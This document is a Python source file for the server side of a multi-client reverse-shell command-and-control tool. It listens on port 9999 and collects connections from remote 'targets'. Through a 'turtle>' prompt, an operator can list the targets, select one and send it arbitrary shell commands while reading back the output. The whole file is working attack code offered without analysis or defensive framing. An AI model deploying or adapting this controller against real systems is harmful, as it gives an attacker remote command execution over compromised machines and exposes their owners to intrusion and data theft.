import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS=2
JOB_NUMBER=[1,2]
queue=Queue()
all_connections=[]
all_addresses=[]


#create socket for  computers to be connected
def socket_create():
    try:
        global host
        global port
        global s
        host=''
        port=9999
        s=socket.socket()
    except socket.error as msg:
        print("Socket creation error:"+str(msg))


#bind socket to port and wait for connection
def socket_bind():
    try:
        global host
        global port
        global s
        print("binding to port:"+str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error"+str(msg)+"\n"+"Retrying ..")
        socket_bind()

#accept the multiple clients and save to lists
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn,address=s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\n connection has been established "+ address[0])
        except:
            print("Error accepting connections")

#interactive prompt for sending commands
def start_turtle():
    while True:
        print("In turtle")
        cmd=input('turtle>')
        if cmd == 'list':
            print("In turtle list")
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("command not recognized")

#displays all connections
def list_connections():
    results=''    
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue 
        results += str(i)+' '+str(all_addresses[i][0])+'    '+str(all_addresses[i][1])+'\n'
    print('--Clinets---'+'\n'+results)

#select a target 
def get_target(cmd):
    try:
        target=cmd.replace('select ', '')
        target=int(target)
        conn=all_connections[target]
        print("you are now connected 2 "+str(all_addresses[target][0]))
        print(str(all_addresses[target][0])+'>',end="")
        return conn
    except:
        print("Not a valid selections")
        return None

#connect with remote target 
def send_target_commands(conn):
    while True:
        try:
            cmd=input()
            if len(str.encode(cmd)) >0:
                conn.send(str.encode(cmd))
                client_response=str(conn.recv(20480),"utf-8")
                print(client_response, end="")
            if cmd=='quit':
                break
        except:
            print("connection was lost")
            break

#create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t=threading.Thread(target=work)
        t.daemon=True
        t.start()

#do next job in queue(connection+ send commands)
def work():
    while True:
        x=queue.get()
        if x==1:
            socket_create()
            socket_bind()
            accept_connections()
        if x==2:
            start_turtle()
        queue.task_done()
        

#Each list item is a job
def create_job():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
        


create_workers()
create_job()
